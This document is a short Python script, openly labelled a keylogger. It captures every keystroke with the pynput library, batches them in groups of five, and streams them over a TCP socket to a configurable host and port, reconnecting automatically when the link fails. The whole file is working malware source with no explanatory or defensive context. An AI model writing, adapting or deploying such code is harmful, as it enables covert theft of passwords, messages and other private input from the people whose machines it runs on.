#!/usr/bin/env python3

import time
import socket
from pynput.keyboard import Key, Listener

HOST = "127.0.0.1"
PORT = 6969
COUNT = 0
KEYS = []

def establishConnection():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print(f"[*] Establishing TCP connection at {HOST}:{PORT}")
    try:
        s.connect((HOST, PORT))
        print("[+] Connection established")
    except:
        print("[-] Connection error")
        print("[+] Trying again in 10s")
        time.sleep(10)
        establishConnection()

def onKeyPress(keycode):
    global COUNT, KEYS

    key = str(keycode).replace("'", "")
    
    if key.find("Key.") != -1 :
        key = key.replace("Key.", "<") + ">"

    KEYS.append(key)
    COUNT += 1

    if COUNT >= 5:

        COUNT = 0
        keyBytes = str.encode(''.join(KEYS))
        
        try:
            s.sendall(keyBytes)
        except:
            print("[-] Connection error")
            establishConnection()
        
        KEYS = []

def main():
    print("[*] Keylogger started")
    establishConnection()

    listener = Listener(on_press=onKeyPress)
    listener.start()

    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()



